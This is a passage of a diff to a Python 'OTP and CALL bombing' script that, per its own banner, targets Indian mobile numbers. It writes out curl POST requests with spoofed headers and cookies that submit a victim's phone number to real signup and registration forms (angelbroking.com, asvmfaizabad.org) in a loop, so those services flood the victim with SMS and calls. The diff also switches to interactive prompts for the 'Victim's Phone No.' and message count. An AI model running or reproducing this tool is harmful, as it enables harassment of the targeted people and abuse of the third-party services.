-                        curl -X POST -H "Host:www.angelbroking.com" -H "content-length:123" -H "cache-control:max-age=0" -H "upgrade-insecure-requests:1" -H "origin:https://www.angelbroking.com" -H "content-type:application/x-www-form-urlencoded" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:navigate" -H "sec-fetch-user:?1" -H "sec-fetch-dest:document" -H "referer:https://www.angelbroking.com/open-demat-account" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:umqSiteTimer=0" -H "cookie:19229.vst=%7B%22s%22%3A%2226f30b91-0d2c-422e-b023-dd8565155821%22%2C%22t%22%3A%22returning%22%2C%22lu%22%3A1604564031935%2C%22lv%22%3A1604563645897%2C%22lp%22%3A0%7D" -H "cookie:cto_bundle=WkNuxl9vZThZc2d1RFZEVHFTYnlLUE1QYTNQMWR0YlFmVTZ3RVN4emN4OGluUkpYOTMlMkY4ZHRVTVJWOGFpQkluJTJCdW5BVnJFUnVNU2x2aEk4ckxOWW1DaDN6SmpucWJGZTl0OWFlb0VoOWlCRnVxeUlnSExpMnMyUThyVzlGekFsRkJBU1M5UkN6SkxJbFlFbzJWT3BjRGIlMkJxRlElM0QlM0Q" -H "cookie:gat_UA-1186489-17=1" -H "cookie:umqorderVal2=%229519874704%22" -H "cookie:storejs=%22storejs%22" -H "cookie:PageCookie=Lead:https://www.angelbroking.com/open-demat-account,Previous:https://www.angelbroking.com/" -H "cookie:lotl=https%3A%2F%2Fwww.angelbroking.com%2F" -H "cookie:_lo_v=1" -H "cookie:_lorid=156545-1604563454540-8a19f094f5338582" -H "cookie:_lo_uid=156545-1604563454540-7e143755be6613e0" -H "cookie:LandPageCookie=https://www.angelbroking.com/" -H "cookie:SourceMediumCookie30=direct/none" -H "cookie:CookieSourceMedium=direct/none" -H "cookie:_fbp=fb.1.1604563209374.2038457169" -H "cookie:_gid=GA1.2.113287213.1604563179" -H "cookie:_ga=GA1.2.amp-9OAU3zf-Ro1-GQscZ6fKiA" -H "cookie:_gcl_au=1.1.229780243.1604563178" -H "cookie:_cfduid=de733792a27631a027bfa486e16f221d41604563134" -d 'name=Sparky+Hacker&mobile='''
+                        curl -X POST -H "Host:www.angelbroking.com" -H "content-length:123" -H "cache-control:max-age=0" -H "upgrade-insecure-requests:1" -H "origin:https://www.angelbroking.com" -H "content-type:application/x-www-form-urlencoded" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:navigate" -H "sec-fetch-user:?1" -H "sec-fetch-dest:document" -H "referer:https://www.angelbroking.com/open-demat-account" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:umqSiteTimer=0" -H "cookie:19229.vst=%7B%22s%22%3A%2226f30b91-0d2c-422e-b023-dd8565155821%22%2C%22t%22%3A%22returning%22%2C%22lu%22%3A1604564031935%2C%22lv%22%3A1604563645897%2C%22lp%22%3A0%7D" -H "cookie:cto_bundle=WkNuxl9vZThZc2d1RFZEVHFTYnlLUE1QYTNQMWR0YlFmVTZ3RVN4emN4OGluUkpYOTMlMkY4ZHRVTVJWOGFpQkluJTJCdW5BVnJFUnVNU2x2aEk4ckxOWW1DaDN6SmpucWJGZTl0OWFlb0VoOWlCRnVxeUlnSExpMnMyUThyVzlGekFsRkJBU1M5UkN6SkxJbFlFbzJWT3BjRGIlMkJxRlElM0QlM0Q" -H "cookie:gat_UA-1186489-17=1" -H "cookie:umqorderVal2=%229519874704%22" -H "cookie:storejs=%22storejs%22" -H "cookie:PageCookie=Lead:https://www.angelbroking.com/open-demat-account,Previous:https://www.angelbroking.com/" -H "cookie:lotl=https%3A%2F%2Fwww.angelbroking.com%2F" -H "cookie:_lo_v=1" -H "cookie:_lorid=156545-1604563454540-8a19f094f5338582" -H "cookie:_lo_uid=156545-1604563454540-7e143755be6613e0" -H "cookie:LandPageCookie=https://www.angelbroking.com/" -H "cookie:SourceMediumCookie30=direct/none" -H "cookie:CookieSourceMedium=direct/none" -H "cookie:_fbp=fb.1.1604563209374.2038457169" -H "cookie:_gid=GA1.2.113287213.1604563179" -H "cookie:_ga=GA1.2.amp-9OAU3zf-Ro1-GQscZ6fKiA" -H "cookie:_gcl_au=1.1.229780243.1604563178" -H "cookie:_cfduid=de733792a27631a027bfa486e16f221d41604563134" -d 'name=Tsunami+Bomber&mobile='''
             + target +
             '''&city=pune&web_placement_id=21&ref_url=-&page_url=%2Fopen-demat-account%2F&post-id=2752' "https://www.angelbroking.com/form-gateways/oda-form.php" > /dev/null 2>&1
                         ''')
@@ -513,9 +523,9 @@ def infinite(target, color, msgs):
 
         os.popen(
             '''
-                        curl -X POST -H "Host:asvmfaizabad.org" -H "Connection:keep-alive" -H "Content-Length:83" -H "Cache-Control:max-age=0" -H "Upgrade-Insecure-Requests:1" -H "Origin:http://asvmfaizabad.org" -H "Content-Type:application/x-www-form-urlencoded" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9" -H "Referer:http://asvmfaizabad.org/register.php" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -H "Cookie:wh-widget-cookie=1" -d 'sname=Madarchod&sclass=XII&sphone='''
+                        curl -X POST -H "Host:asvmfaizabad.org" -H "Connection:keep-alive" -H "Content-Length:83" -H "Cache-Control:max-age=0" -H "Upgrade-Insecure-Requests:1" -H "Origin:http://asvmfaizabad.org" -H "Content-Type:application/x-www-form-urlencoded" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9" -H "Referer:http://asvmfaizabad.org/register.php" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -H "Cookie:wh-widget-cookie=1" -d 'sname=Tsunami&sclass=XII&sphone='''
             + target +
-            '''&spassword=Madarchod&ssection=A&submit=' "http://asvmfaizabad.org/register.php"  > /dev/null 2>&1
+            '''&spassword=tsunamiastronomia&ssection=A&submit=' "http://asvmfaizabad.org/register.php"  > /dev/null 2>&1
                         ''')
 
         if times > msgs * 3:
@@ -524,61 +534,28 @@ def infinite(target, color, msgs):
             pass
 
 
-def banner():
-    os.system('''
-    printf "\n"
-    printf "         ████████╗███████╗██╗   ██╗███╗   ██╗ █████╗ ███╗   ███╗██╗\n"
-    printf "         ╚══██╔══╝██╔════╝██║   ██║████╗  ██║██╔══██╗████╗ ████║██║\n"
-    printf "            ██║   ███████╗██║   ██║██╔██╗ ██║███████║██╔████╔██║██║\n"
-    printf "            ██║   ╚════██║██║   ██║██║╚██╗██║██╔══██║██║╚██╔╝██║██║\n"
-    printf "            ██║   ███████║╚██████╔╝██║ ╚████║██║  ██║██║ ╚═╝ ██║██║\n"
-    printf "            ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝\n\n"
-        printf "\e[1;32m         ╔════════════════════════════════════════════════════════╗\n"
-        printf "\e[1;32m         ║         \e[0m\e[1;95m OTP and CALL Bombing Python Script  \e[1;32m          ║\n"
-        printf "\e[1;32m         ║      \e[0m\e[1;95m Developed by:\e[31m DopeSatan - Utsanjan Maity\e[1;32m         ║\n"
-    printf "\e[1;32m         ║  \e[0m\e[1;95m Only Indian mobile numbers are currently supported\e[1;32m   ║\n"
-    printf "\e[1;32m         ╚════════════════════════════════════════════════════════╝\n"
-        printf "\n"
-        printf "         \e[101m\e[1;77m                                                          \e[0m\n"
-    printf "         \e[101m\e[1;77m      DISCLAIMER:~ Developer will not be responsible      \e[0m\n"
-        printf "         \e[101m\e[1;77m      for any misuse or damage caused by this script      \e[0m\n"
-    printf "         \e[101m\e[1;77m     Please do not use this script for taking Revenge     \e[0m\n"
-    printf "         \e[101m\e[1;77m                                                          \e[0m\n"
-        printf "\n"
-        ''')
-
-
 colors = [
     '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m',
     '\033[1;36m'
 ]
 color = random.choice(colors)
 print('\n\n')
+banner()
+t = input("Enter the Victim's Phone No.: +91")
+m = int(input("Now enter the SMS count: "))
 
-parser = argparse.ArgumentParser()
-parser.add_argument('-t',
-                    type=str,
-                    default=0,
-                    help="Use this Argument to Add Target.")
-parser.add_argument(
-    '-m',
-    type=int,
-    default=0,
-    help="Use this Argument to Set Number of Msgs You want to Send.")
-
-args = parser.parse_args()
-target = str(args.t)
+target = t
 max = 10**500
-msgs = args.m
+msgs = m
 if target == '':
     banner()
     print(
-        "Please Enter the Number of Target with -t Argument (use -h Argument for Help)"
+        "Please enter a valid Phone Number of the Victim..."
     )
-elif msgs == 0:
+elif msgs <= 0:
     banner()
     print(
-        "Please Enter the Number of Msgs with -m Argument (use -h Argument for Help)"
+        "Invalid SMS count..."
     )
 elif msgs > max:
     banner()
@@ -587,12 +564,11 @@ elif msgs > max:
 elif len(target) == 10 and msgs <= max:
     print(color)
     banner()
-    check()
     infinite(target, color, msgs)
     banner()
     print(color)
-    print("\t\t\t\t\t   Bombed " + str(msgs) + " Msgs Successfully...")
+    print("\t\t\t  Bombed " + str(msgs) + " Msgs Successfully...")
 else:
     print(
-        "Please Enter Correct Mobile Number and Number of Msgs or Contact DopeSatan (instagram: @utsanjan)"
+        "Please Enter a valid Phone Number and SMS count\nContact DopeSatan for queries (instagram: @utsanjan)"
     )
